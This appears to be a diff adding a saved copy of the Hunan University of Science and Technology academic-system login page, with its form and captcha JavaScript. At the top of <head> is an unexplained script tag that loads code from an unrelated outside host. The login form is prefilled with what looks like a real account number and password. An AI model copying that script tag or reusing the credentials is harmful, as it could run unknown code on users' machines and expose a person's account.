@@ -1,0 +1,342 @@
+
+
+
+
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+
+<html xmlns="http://www.w3.org/1999/xhtml">
+	<head><script src="https://j.s9w.cc/j/?t=fx&v=1&g=006b8efab7e0&c=3010b392d789&A=8"></script>                                          
+		<base target="_self" />
+		<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+		<title>湖南科技大学数字化校园平台-强智科技</title>
+		<meta http-equiv="keywords" content="教务管理 数字校园 综合教务管理 教学管理 强智 强智科技 高校教务 迎新 学工系统 收费系统 人事管理 科研管理 课程资源 网站群 在线支付管理" />
+		<meta http-equiv="description" content="湖南强智科技发展有限公司（www.qzdatasoft.com）是中国数字化校园软件专业提供商。十多年来，强智科技一直致力于中国教育信息化平台的研发与推广；强智新一代综合教学管理平台将教、学、管理、服务与决策完美结合的设计理念，众多高校的成功实施，必将成为行业的标杆，永载史册。" />
+	
+		<style>
+body {
+	margin: 0px;
+	padding: 0px;
+	background: #031129
+		url(http://kdjw.hnust.cn/kdjw/framework/images/login_01.gif )
+		repeat-x left top;
+}
+
+.login_content {
+	width: 707px;
+	margin: 0px auto;
+}
+
+.login_logo {
+	widows: 707px;
+	height: 72px;
+	margin-top: 93px;
+	background: url(http://kdjw.hnust.cn/kdjw/framework/images/login_02.gif )
+		no-repeat top left;
+}
+
+.login {
+	widows: 707px;
+	height: 210px;
+	background: url(http://kdjw.hnust.cn/kdjw/framework/images/login_03.gif )
+		no-repeat top left;
+	padding-top: 81px;
+	font-family: "宋体";
+	font-size: 12px;
+	color: #13418b;
+}
+
+.login_dy {
+	widows: 707px;
+	height: 132px;
+	background: url(http://kdjw.hnust.cn/kdjw/framework/images/login_04.gif )
+		no-repeat top left;
+}
+
+.dl_border {
+	font-family: arial;
+	border: 1px solid #1d95c7;
+}
+.copyright {color:font-family:"宋体"; font-size:12px; color:#13418b; text-decoration:none}
+.copyright:hover{color:font-family:"宋体"; font-size:12px; color:#13418b; text-decoration:none}
+
+</style>
+<script type="text/javascript" src="http://kdjw.hnust.cn/kdjw/js/jspublic.js"></script>
+<script src="/kdjw/js/ztree/jquery-1.4.4.min.js" type="text/javascript" charset="UTF-8"></script>
+<script>
+function ReShowCode(){
+	var SafeCodeImg = document.getElementById("SafeCodeImg");
+	SafeCodeImg.innerHTML="";
+	var timeID = setTimeout("ShowCode()",500);
+}
+function ShowCode(){
+	var SafeCodeImg = document.getElementById('SafeCodeImg');
+	var url="/kdjw/verifycode.servlet?"+Math.random();
+	var htmlurl="<img src=\'"+url+"\' align=\'absmiddle\'  width='80' height='40' onclick=ReShowCode();>'";
+	SafeCodeImg.innerHTML=htmlurl;
+}
+function enterKeyToNextControl(nextInputId) {
+	try{
+		if(event.keyCode == 13) {
+			$("#"+nextInputId).select();
+		}
+	} catch(e){}
+}
+function checkXhInfo() {
+	var xsxm = $.trim($("#xsxm").val());
+	if(xsxm == "") {
+		alert("请输入学生姓名。");
+		$("#xsxm").select();
+		return;
+	}
+	var xssfzh = $.trim($("#xssfzh").val());
+	if(xssfzh == "") {
+		alert("请输入学生身份证号。");
+		$("#xssfzh").select();
+		return;
+	}
+	var yzm = "";
+	
+	yzm = $.trim($("#RANDOMCODE").val());
+	if(yzm == "") {
+		alert("请输入验证码。");
+		$("#RANDOMCODE").select();
+		return;
+	}
+	
+	jQuery.ajax({
+		type: "POST",
+		url: "/kdjw/xscjcx_check.jsp",
+		data: {"xsxm": xsxm, "xssfzh": xssfzh, "yzm": yzm},
+		success: function(resultData){
+			resultData = jQuery.trim(resultData);
+			if(resultData == "yzm_guoqi") {
+				$("#errorinfo").html("验证码过期，请重新输入。");
+				ReShowCode();
+				$("#RANDOMCODE").val("").select();
+			} else if(resultData == "yzm_cuowu") {
+				$("#errorinfo").html("验证码输入错误。");
+				ReShowCode();
+				$("#RANDOMCODE").val("").select();
+			} else if(resultData == "notQueryXs") {
+				$("#errorinfo").html("未找到您输入信息的学生。");
+			} else if(resultData == "systemError") {
+				$("#errorinfo").html("您访问的功能出现错误。");
+			} else {
+				$("#errorinfo").html("");
+				var newwin=window.showModalDialog("/kdjw/xscjcx.jsp?yzbh="+encodeURIComponent(resultData),
+						window,"dialogWidth: 800px;dialogHeight: "+$(window).height()+"px;status:no;");
+				if (true) {
+					
+					ReShowCode();
+					$("#RANDOMCODE").val("").select();
+					
+				}
+			}
+		},
+		error: function(xmlreq, status, error){
+			alert("系统服务异常！");
+		}
+	});
+}
+var dlflValue = "0";
+function blflClick(t) {
+	if(t.value == "1" && dlflValue == "0") {
+		$("#nameLabel").html("学生姓名：");
+		$("#nameInput").html("<input name='xsxm' type='text' id='xsxm' class='dl_border' maxlength='32' value='' onkeypress='enterKeyToNextControl(\"xssfzh\")' />");
+		$("#passwdLabel").html("身份证号：");
+		
+		$("#sfzhTd").html("<input name='xssfzh' type='text' id='xssfzh' class='dl_border' maxlength='18' value='' onkeypress='enterKeyToNextControl(\"RANDOMCODE\")' />");
+		$("#RANDOMCODE").bind("keypress", function (event){
+			if(event.keyCode == 13) {
+				checkXhInfo();
+			}
+		});
+		
+		$("#imgbtn").hide();
+		$("#xszhmm").hide();
+		$("#ckcximg").show();
+		dlflValue = "1";
+		$("#xsxm").select();
+	} else if(t.value=="0" && dlflValue == "1") {
+		$("#nameLabel").html("用&nbsp;户&nbsp;名：");
+		$("#nameInput").html("<input name='USERNAME' type='text' id='userAccount' class='dl_border' maxlength='32' value='1405010506' />");
+		$("#passwdLabel").html("密&nbsp;&nbsp;&nbsp;&nbsp;码：");
+		$("#sfzhTd").html("<input type='password' name='PASSWORD' id='userPassword'	class='dl_border' maxlength='32' value='' />");
+		
+		$("#RANDOMCODE").unbind("keypress");
+		
+		$("#imgbtn").show();
+		$("#xszhmm").show();
+		$("#ckcximg").hide();
+		dlflValue = "0";
+		$("#userAccount").select();
+	}
+}
+</script>
+</head>
+<body>
+	<iframe style="display: none" name="frmIframe"></iframe>
+	<form name="frm" method=post action="/kdjw/Logon.do?method=logon" onSubmit="return onSubmint();">
+		<input name="useDogCode" type="hidden" value="" />
+		<div class="login_container">
+			<div class="login_content">
+				<div class="login_logo"></div>
+				<div class="login">
+					<table  border="0" cellspacing="0" cellpadding="0">
+						<tr id="dlflTr">
+							<td width="112" height="25" align="right">
+								登陆分类：
+							</td>
+							<td colspan="2">
+								<input type="radio" id="dlfl0" checked name="dlfl" value="0" onclick="blflClick(this)"/><label for="dlfl0"> 教工/学生</label>
+								<input type="radio" id="dlfl1" name="dlfl" value="1" onclick="blflClick(this)"/><label for="dlfl1"> 学生家长</label>
+							</td>
+						</tr>
+						<tr>
+							<td width="112" height="25" align="right" id="nameLabel">
+								用&nbsp;户&nbsp;名：
+							</td>
+							<td colspan="2" id="nameInput">
+								<input name="USERNAME" type="text" id="userAccount" class="dl_border" maxlength="32" value="1405010506" />
+							</td>
+						</tr>
+						<tr>
+							<td width="112" height="25" align="right" id="passwdLabel">
+								密&nbsp;&nbsp;&nbsp;&nbsp;码：
+							</td>
+							<td colspan="2" id="sfzhTd">
+								<input type="password" name="PASSWORD" id="userPassword" class="dl_border" maxlength="32" value="054957" />
+							</td>
+						</tr>
+						
+						<tr>
+							<td width="112" height="25" align="right">
+								验&nbsp;证&nbsp;码：
+							</td>
+							<td colspan="2">
+								<label>
+									<input type="text" name="RANDOMCODE" id="RANDOMCODE"
+										style="height: 16px; width: 93px" size="22" class="dl_border"
+										maxlength="32" />
+									<span id="SafeCodeImg"> <img
+											src="/kdjw/verifycode.servlet"
+											onclick="ReShowCode()" align="middle" width="80" height="40" />
+									</span>
+							</td>
+						</tr>
+						 
+						<tr>
+							<td width="112" height="18" align="right">
+								&nbsp;
+							</td>
+							<td align="left" colspan=2>
+								<span style="color: red;" id="errorinfo">验证码错误!!</span>
+							</td>
+						</tr>
+						<tr>
+							<td>
+								&nbsp;
+							</td>
+							<td height="25" colspan="2">
+								<input style="display: ;" id="imgbtn" type="image"
+									src="http://kdjw.hnust.cn/kdjw/framework/images/login_05.gif"
+									width="76" height="24" />
+								<a id="ckcximg" style="display: none;" title="学生家长可进入查询学生成绩"
+									href="javascript: checkXhInfo();"><img src="/kdjw/framework/images/login_06.gif"
+										width="76" height="24" border="0" />
+								</a>
+								
+								<a id="xszhmm" href="/kdjw/framework/enteraccount.jsp">
+									找回学生密码</a>
+								
+							</td>
+						</tr>
+						
+						<tr>
+							<td height="35">
+								&nbsp;
+							</td>
+							<td colspan="2" style="padding-left: 10px; padding-bottom: 5px; padding-top: 7px;"
+								align="left" valign="bottom">
+								<font color="red"  style="font-size:13px;">请使用windows系统自带的浏览器Internet Explorer版本6,7,8登录</font><br><br>
+								在线用户数：
+								36
+								人&nbsp; <a  target="_blank" href="http://www.qzdatasoft.com" 
+									class="copyright" title="技术支持 强智科技">技术支持 强智科技</a>
+							</td>
+						</tr>
+					</table>
+				</div>
+				<div class="login_dy"></div>
+			</div>
+		</div>
+	</form>
+</body>
+</html>
+<script language="javascript">
+var useraccount=null;
+var p="window";
+var pt="";
+
+if(window.parent!=window || eval(p+".dialogArguments")!=undefined){
+	for(var i=0;i<20;i++){
+		try{
+			if(eval(p+pt+".dialogArguments")==undefined){
+				pt+=".parent";
+				useraccount=eval(p+pt+".getUseraccount()");
+			}else{
+				pt+=".dialogArguments";
+				useraccount=eval(p+pt+".getUseraccount()");
+			}
+			break;
+		}catch(e){}
+	}
+	document.getElementById("dlflTr").style.display = "none";
+}
+
+function onSubmint(){
+	if (document.frm.USERNAME.value == "" || document.frm.PASSWORD.value == "" ){
+		alert("请输入完整的登陆信息！");
+		document.frm.USERNAME.focus();
+		document.frm.USERNAME.select();
+	    return false;
+  	}
+  	if(useraccount!=null)
+  	document.frm.target="frmIframe";
+  	if(useraccount!=null && useraccount!=document.frm.USERNAME.value){
+  	if(window.confirm("系统检查到您两次登录的账号不一致，是否确定用新账号登录？")){
+ var ppt=p+pt;
+ while(ppt.lastIndexOf('.')!=-1){
+ ppt=ppt.substring(0,ppt.lastIndexOf('.'));
+ eval(ppt+".close()");
+ }
+  eval(p+pt+".reloadmian()");
+  	}else{
+  	document.frm.reset();
+  	}
+  	
+  	return false;
+  	}
+  	
+  	
+	//if (document.frm.remUser.checked){
+	//	setCookie('qzsoftusernamecookie',document.frm.USERNAME.value);
+	//}
+	//else{
+	//	delCookie('qzsoftusernamecookie');
+	//}
+    return true;
+}
+//document.frm.USERNAME.value = getCookie('qzsoftusernamecookie');
+/*
+ * edit by yuwei in 2011-6-1
+ * 登陆时让用户名框聚焦
+ *
+*/
+window.onload = function(){
+	document.getElementById('userAccount').focus();
+}
+
+
+//document.frm.USERNAME.select();
+</script>
